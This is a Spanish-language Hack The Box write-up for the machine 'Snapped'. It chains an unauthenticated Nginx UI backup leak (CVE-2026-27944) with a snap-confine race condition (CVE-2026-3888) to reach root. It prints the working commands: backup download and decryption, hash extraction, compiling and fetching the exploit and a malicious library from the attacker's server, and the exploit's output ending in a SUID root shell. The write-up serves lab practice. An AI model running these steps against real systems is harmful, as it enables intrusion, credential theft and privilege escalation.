HTB Snapped · Hard

Linux CVE-2026-27944 CVE-2026-3888 SUID LPE De backup filtrado a root via race condition en snapd

Snapped es una máquina Hard de Hack The Box que encadena dos vulnerabilidades reales para obtener acceso y escalar a root. El foothold explota CVE-2026-27944 en Nginx UI, que expone el endpoint /api/backup sin autenticación y filtra la clave de cifrado en los headers. La escalada aprovecha CVE-2026-3888, una race condition TOCTOU entre snap-confine (SUID root) y systemd-tmpfiles, que permite secuestrar el linker dinámico y obtener una shell root.

🔓 Foothold — CVE-2026-27944

El panel admin.snapped.htb ejecuta Nginx UI vulnerable. El endpoint /api/backup devuelve un backup completo y en el header X-Backup-Security se filtra la clave AES.

Descarga del backup

curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 \
  | grep -i "X-Backup-Security"
< X-Backup-Security: KEY=... IV=...

Descifrado del archivo

KEY_HEX=$(echo "$KEY" | base64 -d | xxd -p -c 256)
IV_HEX=$(echo "$IV" | base64 -d | xxd -p -c 256)
openssl enc -d -aes-256-cbc -K $KEY_HEX -iv $IV_HEX -nopad \
  -in nginx-ui.zip -out nginx-ui-decrypted.zip
unzip nginx-ui-decrypted.zip

Extracción del hash bcrypt

strings database.db | grep '\$2a\$'

🚀 Escalada de privilegios — CVE-2026-3888

CVE-2026-3888 es una race condition TOCTOU entre snap-confine (SUID root) y systemd-tmpfiles. El exploit abusa de la ventana temporal en la que systemd-tmpfiles borra /tmp/.snap y la recrea con contenido malicioso.

Compilación del exploit (SUID variant)

gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

Transferencia al target

# Máquina atacante
python3 -m http.server 8080

# Target
wget http://10.10.15.237:8080/exploit -O ~/exploit
wget http://10.10.15.237:8080/librootshell.so -O ~/librootshell.so
chmod +x ~/exploit ~/librootshell.so

Ejecución del exploit

El exploit se ejecuta en el momento exacto en que systemd-tmpfiles borra /tmp/.snap:

~/exploit ~/librootshell.so -d
[+] Inner shell PID: 14715
[+] .snap already gone!
[!] TRIGGER — swapping directories...
[+] SWAP DONE — race won!
[+] Poisoned namespace PID: 14895
[+] Payload injected.
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)

Shell root

/var/snap/firefox/common/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
